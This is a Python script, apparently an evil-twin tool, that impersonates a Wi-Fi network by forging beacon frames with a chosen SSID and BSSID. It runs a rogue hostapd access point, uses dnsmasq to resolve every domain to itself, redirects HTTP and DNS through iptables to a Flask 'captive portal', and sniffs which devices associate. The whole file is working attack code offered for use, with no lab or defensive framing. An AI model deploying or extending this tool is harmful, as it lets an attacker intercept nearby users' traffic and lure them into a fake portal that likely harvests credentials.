# beacon_spoofer.py

import os
import sys
import signal
import time
import subprocess
from threading import Thread
from scapy.all import *

CAPTIVE_IP = "192.168.24.1"

# === ARGUMENT CHECK ===
def usage():
    print("Usage: sudo python3 beacon_spoofer.py <SSID> <interface> <bssid>")
    sys.exit(1)

if len(sys.argv) != 4:
    usage()

ssid, iface, bssid = sys.argv[1], sys.argv[2], sys.argv[3]

# === CONFIG GENERATORS ===
def generate_dnsmasq_conf():
    conf = f"""
interface={iface}
dhcp-range=192.168.24.50,192.168.24.150,12h
dhcp-option=3,{CAPTIVE_IP}
dhcp-option=6,{CAPTIVE_IP}
address=/#/{CAPTIVE_IP}
log-queries
no-resolv
"""
    with open("dnsmasq.conf", "w") as f:
        f.write(conf.strip())
    print("[+] dnsmasq.conf generated.")

def generate_hostapd_conf():
    conf = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("hostapd.conf", "w") as f:
        f.write(conf.strip())
    print("[+] hostapd.conf generated.")

# === SYSTEM SETUP ===
def setup_interface_ip():
    os.system(f"ip link set {iface} up")
    os.system(f"ip addr add {CAPTIVE_IP}/24 dev {iface}")
    print(f"[+] Interface {iface} set to {CAPTIVE_IP}")

def setup_iptables():
    os.system("iptables -t nat -F")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.24.1:80")
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.24.1")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
    print("[+] iptables rules set")

# === START SERVICES ===
def start_hostapd():
    print("[*] Starting hostapd...")
    return subprocess.Popen(["hostapd", "hostapd.conf"])

def start_flask_server():
    print("[*] Starting Flask captive portal...")
    return subprocess.Popen(
        ["python3", "web_server/server.py"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

def start_dnsmasq():
    print("[*] Starting dnsmasq...")
    return subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])

# === SPOOFING LOGIC ===
def send_beacons():
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap="ESS")
    essid = Dot11Elt(ID="SSID", info=ssid)
    rsn = Dot11Elt(ID=48, info=(
        '\x01\x00'
        '\x00\x0f\xac\x02'
        '\x02\x00'
        '\x00\x0f\xac\x04'
        '\x00\x0f\xac\x02'
        '\x00\x00'
    ))
    frame = RadioTap()/dot11/beacon/essid/rsn

    print(f"[+] Broadcasting fake SSID '{ssid}' on {iface}")
    try:
        while True:
            sendp(frame, iface=iface, inter=0.1, loop=0, verbose=0)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Stopped beaconing.")

def sniff_associations():
    seen = set()
    def handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype in [0, 2, 4, 11]:
            mac = pkt.addr2
            if mac and mac not in seen:
                seen.add(mac)
                print(f"[+] Device associated: {mac}")
    sniff(iface=iface, prn=handler, store=0)

# === CLEANUP ===
def cleanup(signum, frame):
    print("\n[!] Cleaning up...")
    os.system("iptables -t nat -F")
    os.system("pkill dnsmasq")
    os.system("pkill hostapd")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# === RUN SEQUENCE ===
generate_dnsmasq_conf()
generate_hostapd_conf()
setup_interface_ip()
setup_iptables()

hostapd_proc = start_hostapd()
flask_proc = start_flask_server()
dns_proc = start_dnsmasq()

# # Run sniffer in background
# sniff_thread = Thread(target=sniff_associations)
# sniff_thread.daemon = True
# sniff_thread.start()

# # Start beacon broadcast loop
# send_beacons()